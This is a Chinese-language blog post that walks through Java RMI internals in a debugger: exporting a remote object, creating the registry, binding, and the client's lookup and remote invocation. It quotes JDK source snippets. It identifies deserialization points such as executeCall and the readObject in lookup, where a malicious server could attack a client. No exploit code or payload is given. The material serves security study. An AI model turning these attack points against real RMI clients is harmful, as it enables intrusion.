<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fedd8d9014.png" alt="image-20240524093102686"></p>
<p>再下一步走到 UnicastRemoteObject 的构造函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fedf06bcfe.png" alt="image-20240524093126185"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee0244f07.png" alt="image-20240524093144220"></p>
<p>同时注意到此时的 port 是 0，这里的 0 就是代表默认值（如果传入 0 的话，会开启一个随机端口）。因为这里是把服务发布到网络上（如果对端口有疑惑为什么不是 1099 的要注意区分注册中心和服务端口的区别），所以不可能每种服务固定一个端口，这样子一旦服务过多端口会不够用的。</p>
<p>下一步我们跟到调用 exportObject（导出对象）这个地方：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee30beef5.png" alt="image-20240524093230656"></p>
<p>根据英文意思这里就是发布对象的感觉，这是一个静态函数，而且也是关键语句。因此我们在 RemoteObjImpl 这个类中也可以不继承 UnicastRemoteObject 这个类，直接在构造函数中调用这个静态方法也可以。</p>
<p>这个 obj 是我们要实现的真正逻辑，后面的 new UnicastServerRef 是用于处理网络请求的，可以注意到这里只传了 port 进去，因此 ip 是他可以自动获取到的。</p>
<p>下一步：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee41e0137.png" alt="image-20240524093247800"></p>
<p>可以看见新建了一个类 LiveRef，我们跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee57ec039.png" alt="image-20240524093309872"></p>
<p>传进去的是一个 ID 和一个 port，ID 就是理解成给个编号吧，port 就是之前的默认 0 端口<br>然后我们 ID 就不看了，直接跟进他的构造函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee665ba94.png" alt="image-20240524093324263"></p>
<p>然后可以看到</p>
<blockquote>
<p>第一个参数是 ID<br>第二个参数是 TCPEndpointD 的一个静态函数<br>第三个参数 true</p>
</blockquote>
<p>我们这里只看第二个参数。这里没有必要继续 debug 跟进，直接 debug 停在这里，然后 Ctrl + 鼠标左键 点击进入即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee78b4544.png" alt="image-20240524093342633"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee88c7e99.png" alt="image-20240524093358610"></p>
<p>可以看到他的里面是返回类型为 TCPEndpoint 的一个东西，再看一下 TCPEndpoint 的构造函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fee9dad7ea.png" alt="image-20240524093419601"></p>
<p>发现这里他要接受两个参数，host 和 port。可以感受到这个东西就是一个处理网络请求的东西</p>
<p>然后我们返回到 debug 的地方。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feeabb75e0.png" alt="image-20240524093433656"></p>
<p>这里调用了另一个 LiveRef 构造函数。我们再看一下 LiveRef 的构造函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feebd72928.png" alt="image-20240524093451298"></p>
<p>接收三个参数，ID，Endpoint，isLocal<br>其他都好理解，主要就是这个 Endpoint 是什么，我们看一下它里面有什么东西：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feecd4c8f9.png" alt="image-20240524093507103"></p>
<p>发现这里 host 已经被获取了<br>但是 port 还是 0，port 如何获取我们后面在分析</p>
<p>LiveRef 的创建到这里就完成了，我们需要记住 LiveRef 的 ID，并且我们从头到尾只创建了这一个 LiveRef</p>
<p>再往下走，这里也只进行了赋值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feee103b2b.png" alt="image-20240524093526936"></p>
<p>继续往下走：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feef0e2095.png" alt="image-20240524093542776"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef051f9c0.png" alt="image-20240524093602957"></p>
<p>这里的 UnicastServRef 就是刚才赋值的的那个东西，只不过包装了而已，而且这也进行了赋值<br>然后继续往下走到 sref.exportObject，继续对 sref “exportObject”</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef186d0fe.png" alt="image-20240524093622152"></p>
<p>但是我们发现这里创建了代理 stub</p>
<p><strong>stub 明明是客户端的代理，为什么要在服务端创建</strong></p>
<p>因为需要现在服务端创建完这个代理放在注册中心，客户端再到注册中心去使用这个 stub 进行操作</p>
<p>我们往下看一下这个 stub 是怎么创建的<br>第一步是创建一个远程对象类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; remoteClass;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    remoteClass = getRemoteClass(implClass);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">        <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">        implClass.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二步是判断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (forceStubUse ||!(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line"> </span><br><span class="line">forceStubUse 表示当不存在时是否抛出异常</span><br><span class="line">是否存在以 _Stub 结尾的类。remoteClass + <span class="string">&quot;_Stub&quot;</span> </span><br></pre></td></tr></table></figure>

<p>stubClassExists 的具体逻辑是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第三步就是创建动态代理了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                           interfaces,</span><br><span class="line">                                                           handler);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>创建完 stub，就是收尾工作，这里创建了一个 Target</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef2e22f14.png" alt="image-20240524093644044"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef3f7400b.png" alt="image-20240524093701235"></p>
<p>这里可以看到 LiveRef 的 id 是一样的，ObjectID 也都是一样的，说明用的都是同一个 LiveRef。</p>
<p>创建完 Target 就进行发布</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef51df676.png" alt="image-20240524093719752"></p>
<p>就是对这个 target 进行发布</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef6273d7d.png" alt="image-20240524093736379"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef75873e7.png" alt="image-20240524093755406"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fef86b4360.png" alt="image-20240524093812570"></p>
<p>我们跟进到 listen 里面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fefa06b49d.png" alt="image-20240524093837670"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">server = ep.newServerSocket();</span><br></pre></td></tr></table></figure>

<p>这个部分获取了随机的端口号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fefb4a7adf.png" alt="image-20240524093858197"></p>
<p>可以发现这里创建了一个 Socket 等待别人连接，并且使用了 t.start () 创建一个新的线程。</p>
<p>此时已经成功把服务发布到网络上面了，但是客户端并不知道，注册中心也不知道，所以他自己需要先记录一下这个发布的服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fefcb272db.png" alt="image-20240524093920972"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fefde1e86b.png" alt="image-20240524093939909"></p>
<p>发现这里是用 Map 来记录的，并且把刚才创建的 target 当作值。同时这里还是一个静态表</p>
<blockquote>
<p>从思路来说是不难的，也就是发布远程对象，用 <code>exportObject()</code> 指定到发布的 IP 与端口，端口的话是一个随机值。至始至终复杂的地方其实都是在赋值，创建类，进行各种各样的封装，实际上并不复杂。</p>
<p>还有一个过程就是发布完成之后的记录，理解的话，类似于日志就可以了，这些记录是保存到静态的 HashMap 当中。</p>
<p>这一块是服务端自己创建远程服务的这么一个操作，所以<strong>这一块是不存在漏洞的</strong>。</p>
</blockquote>
<h3 id="注册中心的创建流程"><a href="#注册中心的创建流程" class="headerlink" title="注册中心的创建流程"></a>注册中心的创建流程</h3><p>注册中心的创建和远程服务的发布其实是没有关系的，他们之间并不在乎谁先谁后。因为<strong>发布远程服务和注册中心的创建他们本质上都是一样的</strong>，都是把某个服务发布到某个端口上，只不过注册中心通常是固定在 1099 端口，而服务则是随机发布到某一个端口上。</p>
<p>在 <code>Registry registry= LocateRegistry.createRegistry(1099);</code> 处下断点，我们开始调试代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fefedd1aab.png" alt="image-20240524093955695"></p>
<p>首先是进入了静态方法 createRegisty，并且传入了 port1099.<br>然后这里 new 了一个 RegistryImpl，我们就顺势走到 RegistryImpl 的构造方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664feffd4fdaa.png" alt="image-20240524094011234"></p>
<p><code>if</code> 里面主要是做一些检查，不重要。</p>
<p>重点看下面的 new 一个 LiveRef，然后又 new 了一个 UnicastServRef，并且把 LiveRef 放在里面，之后调用了 setup。</p>
<p>这里其实和前面服务端的创建时一样的流程。只是这里调用了 setup 方法，直接进去看一下。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff013cccec.png" alt="image-20240524094033309"></p>
<p>创建注册中心的流程，前三步是不是都和发布远程对象一样的步骤，接下来其实也是调用了 <code>UnicastServerRef.exportObject</code> 了。这样看来，其实发布远程对象和创建注册中心本质上就是一样的了，他们都执行了一样的步骤。<br>唯一的区别就是调用时第三个参数 permanent 不一样，其实就是代表一个是永久，而另一个是非永久罢了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0222fc5d.png" alt="image-20240524094048100"></p>
<p>接下来我们继续跟进到 exportObject 函数里面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff03b98b8d.png" alt="image-20240524094113241"></p>
<p>到目前为止和我们之前调试发布远程对象都一样，但是我们跟进到 createProxy 里面就开始有区别了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff04a7b080.png" alt="image-20240524094128076"></p>
<p>因为这里会执行一个 stubClassExists，这个函数的代码逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//功能就是判断JDK中是否有以xxx_Stub的类，有的话就加载</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff05ba941b.png" alt="image-20240524094145404"></p>
<p>于是就会进入这个类中把他加载出来，具体的加载逻辑是这样的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff06a25c93.png" alt="image-20240524094159866"></p>
<p>这里利用反射 forName 获取类名，然后利用构造器进行实例化加载这个类</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这里和服务端的区别就是：服务端是利用动态代理创建出来的，而注册中心是利用JDK自由的类反射创建出来的</span><br></pre></td></tr></table></figure>

<p>接着往下走</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0798b933.png" alt="image-20240524094215278"></p>
<p>这一步就是判断 stub 是否是服务端定义好的</p>
<p>因为这里的 stub 确实是服务端已经定义好的，于是我们跟进到 setSkeleton 里面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff08ad93d2.png" alt="image-20240524094232532"></p>
<p>再跟到 createSkeleton</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0abc97b3.png" alt="image-20240524094305522"></p>
<p>发现这里和上面创建 stub 一样也是直接利用反射获取 JDK 的类名来实例化这个类<br>出来之后就是创建 target，然后发布到网络上，和发布远程对象一样的。</p>
<p>下一步一样的，封装 target。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0bc012ca.png" alt="image-20240524094321444"></p>
<p>可以看到这里还是同一个 LiveRef。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0ced4144.png" alt="image-20240524094340627"></p>
<p>DGC（分布式垃圾回收）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff0df0f306.png" alt="image-20240524094356857"></p>
<p>可以注意到远程服务的 stub 类型是动态代理创建的类型为 <strong>$Proxy0</strong></p>
<h4 id="注册绑定"><a href="#注册绑定" class="headerlink" title="注册绑定"></a>注册绑定</h4><p>这个 checkAccess 就是判断是否本地绑定</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff106652db.png" alt="image-20240524094436152"></p>
<p>然后上面那个判断就是判断这个 name 是否绑定过，没绑定过就 put 呗<br>这个 bingdings 本质上就是一个 HashTable，然后把远程对象绑定进去</p>
<h3 id="客户端请求注册中心和服务端"><a href="#客户端请求注册中心和服务端" class="headerlink" title="客户端请求注册中心和服务端"></a>客户端请求注册中心和服务端</h3><p>客户端需要做两件事：</p>
<p>1、向注册中心获取远程对象的代理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>2、通过这个代理向服务端做远程调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br></pre></td></tr></table></figure>

<h4 id="获取远程对象的代理"><a href="#获取远程对象的代理" class="headerlink" title="获取远程对象的代理"></a>获取远程对象的代理</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1180fff0.png" alt="image-20240524094453917"></p>
<p>我们可以发现他的流程和服务端的一样：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff12a13343.png" alt="image-20240524094511812"></p>
<p>都是重新 createProxy，然后利用 forName 来加载类</p>
<p>执行完后我们可以看到：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff13d56a05.png" alt="image-20240524094531134"></p>
<p>这里就是获取注册中心的 stub 对象，下一步就是通过名字来获取远程对象</p>
<p>我们往下看 lookup</p>
<p>这里因为 <code>RegistryImpl_Stub.class</code> 是 <code>java 1.1</code> 编译的。但是我们的环境是 <code>java 1.8</code> 所以，这里在进行反编译的时候，就会因为反编译的时候，行号会乱。而且无法进行 debug</p>
<p>直接看静态代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff160a23db.png" alt="image-20240524094606088"></p>
<p>下面那个 newCall 就是创建一个连接</p>
<p>然后有一个 writeObject (var1), 这个 var1 就是我们传进来的字符串。我们发现了他被序列化了，到时候注册中心就会反序列化读取他</p>
<p>再往下就是重点 invoke 方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1715eb3b.png" alt="image-20240524094623214"></p>
<p><code>invoke</code> 方法会调用 <code>executeCall()</code> 方法<br><code>executeCall()</code> 方法中的捕获异常中有一个 <strong>readObject</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff17fa70e6.png" alt="image-20240524094637515"></p>
<p><strong>在这里如果服务端是一个恶意的类被服务端加载的话，就可以达到攻击客户端的目的</strong></p>
<p>执行完 invoke 下面还有一个攻击客户端的利用点：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff18f33fdb.png" alt="image-20240524094652850"></p>
<p>因为这里客户端获取服务端的远程对象的过程是通过反序列化读取他的，那么<strong>如果服务端是恶意的反序列反参数就可以攻击客户端</strong></p>
<p>但是这两个反序列的攻击点还是 invoke 进去的 <strong>executeCall ()</strong> 这里更加隐蔽，更加常用到。因为很多函数都会调用 invoke 方法。如 bind ()，list ()</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>客户端请求注册中心的时候，有两个反序列化的点：<code>executeCall()</code> 和 <code>lookup</code> 里面的 <code>readObject</code></p>
<h4 id="向服务端做远程调用"><a href="#向服务端做远程调用" class="headerlink" title="向服务端做远程调用"></a>向服务端做远程调用</h4><p>我们从 <code>remoteObj.sayHello</code> 开始调试<br>发现我们调试第一步就直接进入了 <code>invoke</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff19d32beb.png" alt="image-20240524094707111"></p>
<p>因为这里 remoteObj 是一个动态代理，所以调用方法的时候就会直接进入 invoke。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1ac810ad.png" alt="image-20240524094722420"></p>
<p>我们从 invokeRemoteMethod 进入<br>然后跟进 invoke：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664ff1bbaf127.png" alt="image-20240524094737588"></p>
<p>之后的走到 marshalValue 函数，这个函数就是判断是否是基本类型，不是的话就序列化</p>
